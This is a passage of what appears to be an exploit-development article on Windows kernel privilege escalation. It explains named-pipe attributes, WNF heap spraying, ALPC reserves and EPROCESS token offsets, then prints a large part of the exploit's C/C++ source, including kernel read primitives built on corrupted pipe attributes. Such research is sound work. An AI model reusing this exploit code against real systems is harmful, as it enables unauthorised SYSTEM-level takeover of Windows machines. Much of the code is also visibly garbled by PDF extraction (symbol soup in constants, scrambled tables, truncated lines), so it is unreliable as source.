NTSTATUS NtFsControlFile( HANDLE FileHandle, HANDLE Event, PIO\_APC\_ROUTINE ApcRoutine, PVOID ApcContext, PIO\_STATUS\_BLOCK IoStatusBlock, ULONG FsControlCode, PVOID InputBuffer, ULONG InputBufferLength, PVOID OutputBuffer, ULONG OutputBufferLength\
\
);\
\
// Brief List of well-known FSCTL codes related to pipes #define FSCTL\_PIPE\_TRANSCEIVE 0x0011401C #define FSCTL\_PIPE\_WAIT 0x00114010 #define FSCTL\_PIPE\_PEEK 0x0011400C #define FSCTL\_PIPE\_QUERY\_CLIENT\_PROCESS 0x00114014 #define FSCTL\_PIPE\_LISTEN 0x00114004 #define FSCTL\_PIPE\_SET\_CLIENT\_PROCESS 0x00114018 #define FSCTL\_PIPE\_IMPERSONATE 0x00114008 #define FSCTL\_PIPE\_QUERY\_EVENT 0x00114024 #define FSCTL\_PIPE\_INTERNAL\_READ 0x00110038 #define FSCTL\_PIPE\_INTERNAL\_WRITE 0x0011001C #define FSCTL\_PIPE\_INTERNAL\_TRANSCEIVE 0x00110020 #define FSCTL\_PIPE\_INTERNAL\_WAIT 0x00110024\
\
From PipeAttribute structure, a quick analysis reveals that it first field (list) is a doubly-linked list, the second attribute (AttributeName) is a pointer to attribute name string, and the third field (AttributeValueSize) is the size of the attribute value. The fourth field (AttributeValue field) is quite misleading because it points to the serialized blob representing the attribute itself (header $^ +$ attribute data), which holds the potential leak and the fifth field (data\[0\]) holds raw inline data.\
\
In other words, the fixed part of the structure is $\\mathtt { 0 } \\mathtt { x } 2 8$ byte $5 + 0 { \\times } 8$ bytes (header from the serialized buffer sent through NtFsControlFile function, and that comes before PipeAttribute structure), and everything else is attribute data. Therefore, the actual space for data is $0 { \\times } 1 0 0 0 - 0 { \\times } 3 0 { = } 1 { \\times } 5 0 0$ (by the way, $0 \\times 1 0 0 0$ bytes represents the buffer allocated by Windows Named Pipe File System for control operations and, not coincidently, is also the memory page size on Windows.). The breakout of this representation, which is actually the combination of two structures, follow below:\
\
|     |     |     |\
| --- | --- | --- |\
| Offset | Size | Description |\
| 0x00 | 8 | Protocol/Serialization header (custom format) |\
| 0x08 | 16 | LIST\_ENTRY (Flink/Blink) |\
| 0x18 | 8 | AttributeName (pointer) |\
| 0x20 | 8 | AttributeValueSize (size's value) |\
\
0x28 8 AttributeValue (leaked pointer, and an offset in serialized buffer)\
\
0x30 ... Inline data (raw data: attributeName string $^ +$ attributeValue data)\
\
Another possible question about Pipes might be the decision to take CreatePipe instead of NtCreateNamedPipeFile function. Here is choice is more obvious because CreatePipe allows us to create anonymous and unidirectional pipes and the function implemented in user-mode, which makes it completely accessible, and besides all these points, it is a simpler function to work with because it is a wrapper to internal functions and it hides the complexity. On the other side, NtCreateNamedPipeFile function creates named pipes, which are bidirectional pipes, and in addition to being a native API, its prototype is much more complex:\
\
NTSTATUS NtCreateNamedPipeFile( PHANDLE FileHandle, ACCESS\_MASK DesiredAccess, POBJECT\_ATTRIBUTES ObjectAttributes, PIO\_STATUS\_BLOCK IoStatusBlock, ULONG ShareAccess, ULONG CreateDisposition, ULONG CreateOptions, ULONG NamedPipeType, ULONG ReadMode, ULONG CompletionMode, ULONG MaximumInstances, ULONG InboundQuota, ULONG OutboundQuota, PLARGE\_INTEGER DefaultTimeout\
\
);\
\
It does matter about the chosen object, but all of them always present trade-offs that must be evaluated according to the purpose. As expected, nothing prevents us from combining techniques using objects such as WNF, Pipe Attributes, ALPC, I/O completion reserved pools, Registry key objects, and other ones to get a working exploit.\
\
At this point, all necessary concepts and foundations have been established, and the consolidation of this knowledge will come from the code itself. The next subsection presents the exploit followed by detailed comments.\
\
# 16.05. Exploit code\
\
The upcoming exploit performs privilege escalation using an ALPC Arbitrary write primitive to manipulate token and elevate privileges. I have produced a second version of this exploit, which is almost identical to this one, but it uses direct parent spoofing. Nonetheless, as it would take to many pages too, I removed it from the definitive version of this article.\
\
Readers will see stages marks being printed in the output and even though the output becomes more organized, I always adopt this approach to make easier to debug possible issues in the code and, believe me, it happens much more frequently than I would like to see . Thus, in last instance, these stage markers have been done for me.\
\
A critical recommendation that I can leave here, mainly relevant if you will be using virtual machines to test the exploit, it is that you should wait for 5 minutes, at least, after having logged on or restored snapshots before trying to run the exploit because there are many events happening over this time interval on memory. In this context, if you have issues between the stage 07 and 08, just run the exploit again. Eventually, they can repeat at Stage 16. Additionally, adjusting parameters like WNF\_PAD\_SPRAY\_COUNT and WNF\_SPRAY\_COUNT, or even implementing a double round of ALPC reserve creation may help. My decision was to calibrate between stability and working. Normally, it should work well. By the way, whenever I am developing exploits (all the time), I always encounter various problems or reliability issues, and it makes part of the game. My decisions may and almost certainly will be different from yours, and definitely there is not only one way to accomplish the same task.\
\
Another note is the offset that the token and other fields are located inside \_EPROCESS structure because such offsets vary according to Windows versions and releases. To check them on WinDbg run:\
\
▪ dt nt!\_EPROCESS -y Token ▪ dt nt!\_EPROCESS UniqueProcessId ▪ dt nt!\_EPROCESS ActiveProcessLinks ▪ dt nt!\_EPROCESS ImageFileName\
\
You should get a similar output, where values can vary whether you are not using Windows 10 22H2, Windows 11 23H2 and 22H2:\
\
0: kd> dt nt!\_EPROCESS -y Token +0x4b8 Token : \_EX\_FAST\_REF\
\
0: kd> dt nt!\_EPROCESS UniqueProcessId +0x440 UniqueProcessId : Ptr64 Void\
\
0: kd> dt nt!\_EPROCESS ActiveProcessLinks +0x448 ActiveProcessLinks : \_LIST\_ENTRY\
\
0: kd> dt nt!\_EPROCESS ImageFileName +0x5a8 ImageFileName : \[15\] Uchar\
\
Once all observations have been done, the exploit follows:\
\
#include <Windows.h> #include <cfapi.h> #include <winioctl.h> #include <ShlObj.h> #include <stdio.h> #include  #include <initguid.h> #include <guiddef.h> #include <sddl.h> #include <ntstatus.h> #pragma comment(lib, "Cldapi.lib")\
\
DEFINE\_GUID(ProviderId, $\\Theta \\times$ 1b4f2a33, $\\Theta \\times \\mathsf { b l b 3 }$ , $\\Theta \\times 4 \\Theta \\subset \\Theta$ , $\\Theta \\times \\mathsf { b a }$ , $\\Theta \\times 5 \ a$ , $\\Theta \\times \\Theta 6$ , $\\Theta \\times 3 4$ , $\\Theta \\times \\in \\mathsf { C }$ , $\\Theta \\times 6 3$ , $\\Theta \\times \\mathrm { d e }$ , $\\Theta \\times \\Theta \\Theta$ );\
\
typedef enum \_HSM\_CONSTANTS { HSM\_BITMAP\_MAGIC $=$ 0x70527442,\
\
HSM\_FILE\_MAGIC $=$ $\\Theta \\times 7 \\Theta 5 2 6 5 4 6$ , HSM\_DATA\_HAVE\_CRC $=$ $\\Theta \\times \\Theta 2$ , HSM\_ELEMENT\_TYPE\_UINT64 $=$ $\\Theta \\times \\Theta 6$ , HSM\_ELEMENT\_TYPE\_BYTE $=$ $\\Theta \\times \\Theta 7$ , HSM\_ELEMENT\_TYPE\_UINT32 $\\begin{array} { r l } { = } & { { } \\odot \\times \\odot \\mathsf { A } } \\end{array}$ , HSM\_ELEMENT\_TYPE\_MAX $=$ $\\Theta \\times \\bot \\Theta$ , HSM\_ELEMENT\_TYPE\_BITMAP $=$ $\\Theta \\times \\bot 1$ , } HSM\_CONSTANTS;\
\
static const USHORT HSM\_HEADER\_SIZE $=$ $\\Theta \\times \\perp 4$ ;\
\
static const USHORT HSM\_ELEMENT\_INFO\_SIZE $=$ $\\Theta \\times \\Theta 8$ ;\
\
static const USHORT BTRP\_ALIGN $=$ $\\Theta \\times \\Theta 4$ ;\
\
static const USHORT FERP\_ALIGN $=$ $\\Theta \\times \\Theta 8$ ;\
\
static const USHORT ELEMENT\_NUMBER $=$ $\\Theta \\times \\Theta 5$ ;\
\
static const USHORT MAX\_ELEMS $=$ $\\Theta \\times \\Theta \\mathsf { A }$ ;\
\
static const USHORT VERSION\_VALUE $=$ $\\Theta \\times \\Theta \\Theta \\Theta 1$ ;\
\
static const USHORT ELEMENT\_START\_OFFSET $=$ $\\Theta \\times 6 \\Theta$ ;\
\
static const USHORT FERP\_BUFFER\_SIZE $=$ $\\Theta \\times 4 \\Theta \\Theta \\Theta$ ;\
\
static const USHORT BTRP\_BUFFER\_SIZE $=$ $\\Theta \\times 4 \\Theta \\Theta \\Theta$ ;\
\
static const USHORT COMPRESSED\_SIZE $=$ $\\Theta \\times 4 \\Theta \\Theta \\Theta$ ;\
\
static const USHORT REPARSE\_DATA\_SIZE $=$ $\\Theta \\times 4 \\Theta \\Theta \\Theta$ ; static const DWORD DEFRAG\_PIPE\_COUNT $=$ 5000;\
\
static const DWORD WNF\_PAD\_SPRAY\_COUNT $=$ $\\Theta \\times 5 \\Theta \\Theta \\Theta$ ;\
\
static const DWORD WNF\_SPRAY\_COUNT $=$ $\\Theta \\times 8 \\Theta \\Theta$ ;\
\
static const DWORD WNF\_DATA\_SIZE $=$ $\\Theta \\times \\mathsf { F } \\mathsf { F } \\odot$ ;\
\
static const DWORD ALPC\_PORT\_COUNT $\\begin{array} { r l } { = } & { { } 2 \\Theta \\Theta \\Theta } \\end{array}$ ;\
\
static const DWORD ALPC\_RESERVES\_PER\_PORT $= \ 2 5 7$ ;\
\
static const USHORT PAYLOAD\_FILL\_BYTE $\\begin{array} { r l } { = } & { { } \\odot { \\times } \\mathsf { A B } } \\end{array}$ ;\
\
static const USHORT PAYLOAD\_SIZE\_OVERFLOW $=$ $\\Theta \\times 1 \\Theta 1 0$ ;\
\
static const USHORT PAYLOAD\_OFFSET $=$ $\\Theta \\times 1 \\Theta \\Theta \\Theta$ ;\
\
static const DWORD CHANGE\_STAMP\_FIRST $=$ $\\Theta \\times \\mathsf { C } \\Theta \\mathsf { D } \\mathsf { E }$ ; static const DWORD WNF\_PAD\_SPRAY\_COUNT\_SECOND $=$ $\\odot \\times 2 \\odot \\odot \\odot$ ;\
\
static const DWORD WNF\_SPRAY\_COUNT\_SECOND $=$ $0 \\times 6 \\Theta \\Theta$ ;\
\
static const DWORD PIPE\_SPRAY\_COUNT $=$ $0 \\times 6 \\Theta \\Theta$ ;\
\
static const DWORD CHANGE\_STAMP\_SECOND $=$ $\\Theta \\times$ DEAD;\
\
static const DWORD PIPE\_ATTR\_CLAIM\_SIZE $=$ $\\Theta \\times 2 \\Theta \\Theta$ ;\
\
static const DWORD PIPE\_ATTR\_FILL\_SIZE $=$ $\\Theta \\times \\mathsf { F D } \\Theta$ ; static const DWORD SLEEP\_SHORT $=$ 100;\
\
static const DWORD SLEEP\_NORMAL $=$ 1000;\
\
static const DWORD SLEEP\_LONG $=$ 6000; static const ULONG EPROCESS\_TOKEN\_OFFSET $=$ $\\Theta \\times 4 \\mathsf { B } \\otimes$ ;\
\
static const ULONG EPROCESS\_IMAGEFILENAME\_OFFSET $=$ $= \\phantom { - } \\odot { \\times } 5 \\mathsf { A } 8$ ;\
\
static const ULONG EPROCESS\_UNIQUEPROCESSID\_OFFSET $=$ $\\Theta \\times 4 4 \\Theta$ ;\
\
static const ULONG EPROCESS\_ACTIVEPROCESSLINKS\_OFFSET $=$ $\\Theta \\times 4 4 8$ ; static const ULONG FSCTL\_PIPE\_GET\_PIPE\_ATTRIBUTE $=$ $\\Theta \\times 1 1 \\odot \\odot 3 8$ ;\
\
static const ULONG FSCTL\_PIPE\_SET\_PIPE\_ATTRIBUTE $=$ $\\Theta \\times 1 1 \\Theta \\odot 3 \\mathsf C$ ;\
\
#define ALPC\_MSGFLG\_NONE $\\Theta \\times \\Theta$ #pragma pack(push, 1)\
\
typedef struct \_HSM\_ELEMENT\_INFO { USHORT Type; USHORT Length; ULONG Offset;\
\
} HSM\_ELEMENT\_INFO, $\\star$ PHSM\_ELEMENT\_INFO;\
\
typedef struct \_REPARSE\_DATA\_BUFFER { ULONG ReparseTag; USHORT ReparseDataLength; USHORT Reserved; struct { UCHAR DataBuffer\[FERP\_BUFFER\_SIZE\]; } GenericReparseBuffer;\
\
} REPARSE\_DATA\_BUFFER, $\\star$ PREPARSE\_DATA\_BUFFER;\
\
typedef struct \_REPARSE\_DATA\_BUFFER\_EX { ULONG Flags; ULONG ExistingReparseTag; GUID ExistingReparseGuid; ULONGLONG Reserved; REPARSE\_DATA\_BUFFER ReparseDataBuffer;\
\
} REPARSE\_DATA\_BUFFER\_EX, $\\star$ PREPARSE\_DATA\_BUFFER\_EX;\
\
#pragma pack(pop)\
\
typedef struct \_PIPE\_PAIR { HANDLE hRead; HANDLE hWrite;\
\
} PIPE\_PAIR, $\\star$ PPIPE\_PAIR;\
\
typedef struct \_WNF\_STATE\_NAME { ULONG64 Data\[2\];\
\
} WNF\_STATE\_NAME, $\\star$ PWNF\_STATE\_NAME;\
\
typedef ULONG WNF\_CHANGE\_STAMP, $\\star$ PWNF\_CHANGE\_STAMP;\
\
typedef struct \_WNF\_TYPE\_ID { GUID TypeId;\
\
} WNF\_TYPE\_ID, $\\star$ PWNF\_TYPE\_ID;\
\
typedef const WNF\_TYPE\_ID $\\star$ PCWNF\_TYPE\_ID;\
\
typedef const WNF\_STATE\_NAME $\\star$ PCWNF\_STATE\_NAME;\
\
typedef enum \_WNF\_STATE\_NAME\_LIFETIME { WnfWellKnownStateName $\\begin{array} { r l } { = } & { { } \\odot } \\end{array}$ , WnfPermanentStateName $= ~ 1$ , WnfPersistentStateName $= 2$ , WnfTemporaryStateName $= 3$\
\
} WNF\_STATE\_NAME\_LIFETIME;\
\
typedef enum \_WNF\_DATA\_SCOPE { WnfDataScopeSystem $\\begin{array} { r l } { = } & { { } \\odot } \\end{array}$ , WnfDataScopeSession $= ~ 1$ , WnfDataScopeUser $= 2$ , WnfDataScopeProcess $= 3$ , WnfDataScopeMachine = 4\
\
[https://exploitreversing.com](https://exploitreversing.com/)\
\
typedef struct \_PORT\_MESSAGE { union { struct { USHORT DataLength; USHORT TotalLength; } s1; ULONG Length; } u1; union { struct { USHORT Type; USHORT DataInfoOffset; } s2; ULONG ZeroInit; } u2; union { HANDLE ClientId; double DoNotUseThisField; }; ULONG MessageId; union { SIZE\_T ClientViewSize; ULONG CallbackId; };\
\
} PORT\_MESSAGE, $\\star$ PPORT\_MESSAGE;\
\
typedef struct \_ALPC\_MESSAGE { PORT\_MESSAGE PortHeader; BYTE Data\[ $\\Theta \\times 1 0 0 \_ { - } ^ { - }$ \];\
\
} ALPC\_MESSAGE, $\\star$ PALPC\_MESSAGE;\
\
#pragma pack(pop)\
\
typedef struct \_IO\_STATUS\_BLOCK { union { NTSTATUS Status; PVOID Pointer; }; ULONG\_PTR Information;\
\
} IO\_STATUS\_BLOCK, $\\star$ PIO\_STATUS\_BLO typedef NTSTATUS(NTAPI\* PNtCreateWnfStateName)(PWNF\_STATE\_NAME,\
\
WNF\_STATE\_NAME\_LIFETIME, WNF\_DATA\_SCOPE, BOOLEAN, PCWNF\_TYPE\_ID, ULONG,\
\
PSECURITY\_DESCRIPTOR);\
\
typedef NTSTATUS(NTAPI\* PNtUpdateWnfStateData)(PCWNF\_STATE\_NAME, PVOID, ULONG, PCWNF\_TYPE\_ID, PVOID, WNF\_CHANGE\_STAMP, ULONG);\
\
typedef NTSTATUS(NTAPI\* PNtQueryWnfStateData)(PCWNF\_STATE\_NAME, PCWNF\_TYPE\_ID, PVOID, PWNF\_CHANGE\_STAMP, PVOID, PULONG);\
\
typedef NTSTATUS(NTAPI\* PNtDeleteWnfStateName)(PCWNF\_STATE\_NAME);\
\
typedef NTSTATUS(NTAPI\* PNtAlpcCreatePort)(PHANDLE, POBJECT\_ATTRIBUTES,\
\
PALPC\_PORT\_ATTRIBUTES);\
\
typedef NTSTATUS(NTAPI $\\star$ PNtAlpcCreateResourceReserve)(HANDLE, ULONG, SIZE\_T, PHANDLE); typedef NTSTATUS(NTAPI\* PNtFsControlFile)(HANDLE, HANDLE, PVOID, PVOID,\
\
PIO\_STATUS\_BLOCK, ULONG, PVOID, ULONG, PVOID, ULONG);\
\
typedef NTSTATUS(NTAPI\* PNtAlpcSendWaitReceivePort)(HANDLE, ULONG, PPORT\_MESSAGE, PVOID, PPORT\_MESSAGE, PSIZE\_T, PVOID, PLARGE\_INTEGER);\
\
|     |     |     |\
| --- | --- | --- |\
| https://exploitreversing.com |  |  |\
| } WNF\_DATA\_SCOPE; |  |  |\
|  | typedef struct \_UNICODE\_STRING { |  |\
| USHORT Length; |  |  |\
|  | USHORT MaximumLength; |  |\
|  | PWSTR Buffer; |  |\
|  | } UNICODE\_STRING, \* PUNICODE\_STRING; |  |\
|  | typedef struct \_OBJECT\_ATTRIBUTES { |  |\
| ULONG | Length; |  |\
| HANDLE |  |  |\
|  | PUNICODE\_STRING ObjectName; | RootDirectory; |\
| ULONG | Attributes; |  |\
| PVOID |  | SecurityDescriptor; |\
| PVOID |  | SecurityQualityofService; |\
|  |  | } OBJECT\_ATTRIBUTES, \* POBJECT\_ATTRIBUTES; |\
|  |  |  |\
|  |  | typedef struct \_CLIENT\_ID { |\
|  | HANDLE UniqueThread; | HANDLE UniqueProcess; |\
|  | } CLIENT\_ID, \* PCLIENT\_ID; |  |\
| ULONG | typedef struct \_ALPC\_PORT\_ATTRIBUTES { |  |\
|  | SECURITY\_QUALITY\_OF\_SERVICE SecurityQos; | Flags; |\
|  | SIZE\_T |  |\
|  | SIZE\_T | MaxMessageLength; |\
|  | SIZE\_T | MemoryBandwidth; |\
|  |  | MaxPoolUsage; |\
|  | SIZE\_T | MaxSectionSize; |\
|  | SIZE\_T |  |\
|  | SIZE\_T | MaxViewSize; |\
|  |  | MaxTotalSectionSize; |\
| ULONG |  | DupObjectTypes; |\
| ULONG |  | Reserved; |\
|  |  | } ALPC\_PORT\_ATTRIBUTES, \* PALPC\_PORT\_ATTRIBUTES; |\
|  | #pragma pack(push, 1) |  |\
|  | typedef struct \_KALPC\_RESERVE { |  |\
|  | PVOID OwnerPort; |  |\
|  | PVOID HandleTable; |  |\
| PVOID Handle; |  |  |\
| PVOID MesSage; |  |  |\
| ULONGLONG Size; |  |  |\
| LONG Active; ULONG Padding; |  |  |\
|  | } KALPC\_RESERVE, \* PKALPC\_RESERVE; |  |\
|  |  |  |\
|  | typedef struct \_KALPC\_MESSAGE { |  |\
|  | BYTE Reserved0\[0x60\]; |  |\
| PVOID Reserve; |  |  |\
|  | BYTE Reserved1\[0x78\]; |  |\
|  | PVOID ExtensionBuffer; |  |\
|  | ULONGLONG ExtensionBufferSize; |  |\
|  |  |  |\
|  | BYTE Reserved2\[0x28\]; |  |\
|  | } KALPC\_MESSAGE, \* PKALPC\_MESSAGE; |  |\
\
# [https://exploitreversing.com](https://exploitreversing.com/)\
\
typedef NTSTATUS(NTAPI\* PNtOpenProcess)(PHANDLE, ACCESS\_MASK, POBJECT\_ATTRIBUTES, PCLIENT\_ID);\
\
typedef NTSTATUS(NTAPI $\\star$ PRtlGetCompressionWorkSpaceSize)(USHORT, PULONG, PULONG);typedef NTSTATUS(NTAPI\* PRtlCompressBuffer)(USHORT, PUCHAR, ULONG, PUCHAR, ULONG,ULONG, PULONG, PVOID);\
\
static PNtCreateWnfStateName static PNtUpdateWnfStateData static PNtQueryWnfStateData static PNtDeleteWnfStateName static PNtAlpcCreatePort static PNtAlpcCreateResourceReserve static PNtFsControlFile static PNtAlpcSendWaitReceivePort static PNtOpenProcess\
\
g\_NtCreateWnfStateName $=$ NULL;\
\
g\_NtUpdateWnfStateData $=$ NULL;\
\
g\_NtQueryWnfStateData $=$ NULL;\
\
g\_NtDeleteWnfStateName $=$ NULL;\
\
g\_NtAlpcCreatePort $=$ NULL;\
\
g\_NtAlpcCreateResourceReserve $=$ NULL;\
\
g\_NtFsControlFile $=$ NULL;\
\
g\_NtAlpcSendWaitReceivePort $=$ NULL;\
\
g\_NtOpenProcess $=$ NULL; static std::unique\_ptr<WNF\_STATE\_NAME\[\]> g\_wnf\_pad\_names;\
\
static std::unique\_ptr<WNF\_STATE\_NAME\[\]> g\_wnf\_names;\
\
static std::unique\_ptr<BOOL\[\]> g\_wnf\_active;\
\
static std::unique\_ptr<HANDLE\[\]> g\_alpc\_ports;\
\
static int g\_victim\_index = -1;\
\
static PVOID g\_leaked\_kalpc $=$ NULL;\
\
static HANDLE g\_saved\_reserve\_handle $=$ NULL; static DECLSPEC\_ALIGN(16) BYTE g\_fake\_pipe\_attr $\\left\[ \\Theta \\times 1 0 0 \\Theta \\right\]$ ;\
\
static DECLSPEC\_ALIGN(16) BYTE g\_fake\_pipe\_attr2\[ $\\mathsf { \\Theta } \_ { \\mathsf { - } } \\mathsf { 0 } \\times 1 \\odot \\mathsf { 0 } \\odot \\mathsf { - }$ \];\
\
static char g\_fake\_attr\_name\[\] $=$ "hackedfakepipe";\
\
static char g\_fake\_attr\_name2\[\] $=$ "alexandre";\
\
static int g\_target\_pipe\_index = -1;\
\
static std::unique\_ptr<WNF\_STATE\_NAME\[\] $>$ static std::unique\_ptr<WNF\_STATE\_NAME\[\]> static std::unique\_ptr<BOOL\[\]> static std::unique\_ptr<HANDLE\[\]> static std::unique\_ptr<HANDLE\[\]> static int g\_victim\_index\_second $= ~ - 1$ ; static PVOID g\_leaked\_pipe\_attr $=$ NULL;\
\
static ULONG64 g\_alpc\_port\_addr $\\begin{array} { r l } { = } & { { } \\odot } \\end{array}$ ;\
\
static ULONG64 g\_alpc\_handle\_table\_addr $\\begin{array} { r l } { \\mathrm { ~ ~ { ~ = ~ } ~ } } & { { } \\odot } \\end{array}$ ;\
\
static ULONG64 g\_alpc\_message\_addr $\\begin{array} { r l } { = } & { { } \\odot } \\end{array}$ ;\
\
static ULONG64 g\_eprocess\_addr $\\begin{array} { r l } { \\mathrm { ~ ~ { ~ = ~ } ~ } } & { { } \\odot } \\end{array}$ ;\
\
static ULONG64 g\_system\_eprocess $\\begin{array} { r l } { \\mathrm { ~ ~ { ~ = ~ } ~ } } & { { } \\odot } \\end{array}$ ;\
\
static ULONG64 g\_our\_eprocess $\\begin{array} { r l } { \\mathrm { ~ ~ { ~ = ~ } ~ } } & { { } \\odot } \\end{array}$ ;\
\
static ULONG64 g\_system\_token $\\begin{array} { r l } { \\mathrm { ~ ~ { ~ = ~ } ~ } } & { { } \\odot } \\end{array}$ ;\
\
static ULONG64 g\_our\_token $\\begin{array} { r l } { \\mathrm { ~ ~ { ~ = ~ } ~ } } & { { } \\odot } \\end{array}$ ;\
\
static ULONG g\_winlogon\_pid $\\begin{array} { r l } { \\mathrm { ~ ~ { ~ = ~ } ~ } } & { { } \\odot } \\end{array}$ ; static wchar\_t g\_syncRootPath\[MAX\_PATH\];\
\
static wchar\_t g\_filePath\[MAX\_PATH\];\
\
static wchar\_t g\_filePath\_second\[MAX\_PATH\];\
\
#define RESOLVE\_FUNCTION(module, func\_ptr, func\_type, func\_name) \\do { \\func\_ptr $=$ (func\_type)GetProcAddress(module, func\_name); \\if (!func\_ptr) { \\
\
printf("\[-\] Failed to resolve: %s\\n", func\_name); \ return FALSE; \ } \ } while(0)\
\
static ULONG Calculate\_CRC32(ULONG seed, const void\* buf, size\_t len) { ULONG crc $=$ ~seed; const unsigned char\* p $=$ (const unsigned char\*)buf; for (size\_t i $\\begin{array} { r l } { \\mathrm { ~ ~ { ~ = ~ } ~ } } & { { } \\odot } \\end{array}$ ; i < len; ++i) { crc $\\Lambda =$ p\[i\]; for (int j = 0; j < 8; ++j) { if (crc & 1) cr $= - \\sum \\limits \_ { i = - \\infty } ^ { \\infty } i$ >> 1) ^ $\\Theta \\times$ EDB88320; else crc >>= 1; } } return ~crc;\
\
}\
\
static BOOL IsKernelPointer(ULONG64 value) { return ((value & $\\Theta \\times$ FFFF000000000000ULL) $= =$ 0xFFFF000000000000ULL) && (value ! $=$ $\\Theta \\times$ FFFFFFFFFFFFFFFFULL) && (value ! $=$ 0x5151515151515151ULL) && (value ! $=$ 0x5252525252525252ULL);\
\
}\
\
static BOOL RefreshPipeCorruption(ULONG64 target\_addr, ULONG size) { if (g\_victim\_index\_second $\\begin{array} { r l } { = { } } & { { } - 1 } \\end{array}$ ) return FALSE; ULONG64 $\\star$ fake1 $=$ (ULONG64 $\\star$ )g\_fake\_pipe\_attr; fake1\[0\] $=$ (ULONG64)g\_fake\_pipe\_attr2; fake1\[1\] $=$ (ULONG64)g\_leaked\_pipe\_attr; fake1\[2\] $=$ (ULONG64)g\_fake\_attr\_name; fake1\[3\] $=$ size; fake1\[4\] $=$ target\_addr; fake1\[5\] $=$ 0x4747474747474747ULL; ULONG64\* fake2 $=$ (ULONG64\*)g\_fake\_pipe\_attr2; fake2\[0\] $=$ 0x4848484848484848ULL; fake2\[1\] $=$ (ULONG64)g\_fake\_pipe\_attr; fake2\[2\] $=$ (ULONG64)g\_fake\_attr\_name2; fake2\[3\] $=$ size; fake2\[4\] $=$ target\_addr; fake2\[5\] $=$ $\\Theta \\times$ 4949494949494949ULL; auto overflow\_data $=$ std::make\_unique<BYTE\[\] $>$ ( $\\Theta \\times \\mathsf { F } \\mathsf { F } \\otimes ,$ ); memset(overflow\_data.get(), $\\Theta \\times 5 \\Theta$ , $\\Theta \\times \\mathsf { F } \\mathsf { F } \\otimes ,$ ); $\\star$ (ULONG64\*)(overflow\_data.get() $^ +$ $\\Theta \\times$ FF8 - 8) $=$ (ULONG64)g\_fake\_pipe\_attr; NTSTATUS status $=$ g\_NtUpdateWnfStateData( &g\_wnf\_names\_second\[g\_victim\_index\_second\], overflow\_data.get(), $\\Theta \\times \\mathsf { F } \\mathsf { F } 8$ , NULL, NULL, CHANGE\_STAMP\_SECOND, 0 ); return (status $\\mathrm { \\Omega } = \\mathrm { \\Omega } \\left. { \\mathrm { \\Omega } } \\right.$ );\
\
# [https://exploitreversing.com](https://exploitreversing.com/)\
\
RefreshPipeCorruption(address, $\\Theta \\times \\Theta$ ); BYTE buffer $\[ { \\Theta } \\times \\underline { { { 1 } } } { \\Theta } { \\Theta } \] = \\left{ \\begin{array} { c l } { { \\Theta } } & { { } } \ { { \\Theta } } & { } } \\end{array} \\right.$ ; IO\_STATUS\_BLOCK iosb $=$ {}; NTSTATUS status $=$ g\_NtFsControlFile( g\_pipe\_write\[g\_target\_pipe\_index\], NULL, NULL, NULL, &iosb, FSCTL\_PIPE\_GET\_PIPE\_ATTRIBUTE, g\_fake\_attr\_name, (ULONG)strlen(g\_fake\_attr\_name) + 1, buffer, sizeof(buffer) ); if (status ! $=$ 0) { printf("ReadKernel64 failed: target=0x%llX, statu $5 = \\Theta \\times { } \\stackrel { 0 \\prime } { , } \\odot \\phantom { } \\theta X$ , pipe\_idx=%d\\n", address, status, g\_target\_pipe\_index); return FALSE; } \*out\_value $=$ \*(ULONG64\*)buffer; printf("ReadKernel64: add $r = 0 \\times %$ llX -> value $=$ 0x%llX\\n", address, \*out\_value); return TRUE;\
\
}\
\
static BOOL ReadKernelBuffer(ULONG64 address, PVOID buffer, ULONG size) { if (g\_target\_pipe\_index $\\begin{array} { r l } { = { } } & { { } - 1 } \\end{array}$ \|\| address $= =$ 0 \|\| buffer $= =$ NULL \|\| size $\\mathrm { \\Omega } = \\mathrm { \\Omega } \\left. { \\mathrm { \\Omega } } \\right.$ ) { return FALSE; } RefreshPipeCorruption(address, size); BYTE out\_buffer\[ $\\Theta \\times 1 0 \\Theta \\Theta$ \] $=$ { 0 }; IO\_STATUS\_BLOCK iosb $=$ {}; NTSTATUS status $=$ g\_NtFsControlFile( g\_pipe\_write\[g\_target\_pipe\_index\], NULL, NULL, NULL, &iosb, FSCTL\_PIPE\_GET\_PIPE\_ATTRIBUTE, g\_fake\_attr\_name, (ULONG)strlen(g\_fake\_attr\_name) + 1, out\_buffer, sizeof(out\_buffer) ); if (status ! $=$ 0) return FALSE; memcpy(buffer, out\_buffer, size); return TRUE;\
\
}\
\
static BOOL InitializeNtdllFunctions(void) { HMODULE hNtdll $=$ GetModuleHandleW(L"ntdll.dll"); if (!hNtdll) { printf("\[-\] Failed to get ntdll.dll handle\\n"); return FALSE; } RESOLVE\_FUNCTION(hNtdll, g\_NtCreateWnfStateName, PNtCreateWnfStateName,\
\
"NtCreateWnfStateName"); RESOLVE\_FUNCTION(hNtdll, g\_NtUpdateWnfStateData, PNtUpdateWnfStateData,\
\
"NtUpdateWnfStateData"); RESOLVE\_FUNCTION(hNtdll, g\_NtQueryWnfStateData, PNtQueryWnfStateData,\
\
"NtQueryWnfStateData"); RESOLVE\_FUNCTION(hNtdll, g\_NtDeleteWnfStateName, PNtDeleteWnfStateName,\
\
"NtDeleteWnfStateName"); RESOLVE\_FUNCTION(hNtdll, g\_NtAlpcCreatePort, PNtAlpcCreatePort,\
\
"NtAlpcCreatePort"); RESOLVE\_FUNCTION(hNtdll, g\_NtAlpcCreateResourceReserve,\
\
PNtAlpcCreateResourceReserve, "NtAlpcCreateResourceReserve"); RESOLVE\_FUNCTION(hNtdll, g\_NtFsControlFile, PNtFsControlFile, "NtFsControlFile"); RESOLVE\_FUNCTION(hNtdll, g\_NtAlpcSendWaitReceivePort, PNtAlpcSendWaitReceivePort,\
\
"NtAlpcSendWaitReceivePort"); RESOLVE\_FUNCTION(hNtdll, g\_NtOpenProcess, PNtOpenProcess, "NtOpenProcess"); printf("\[+\] All ntdll functions resolved\\n"); return TRUE;\
\
}\
\
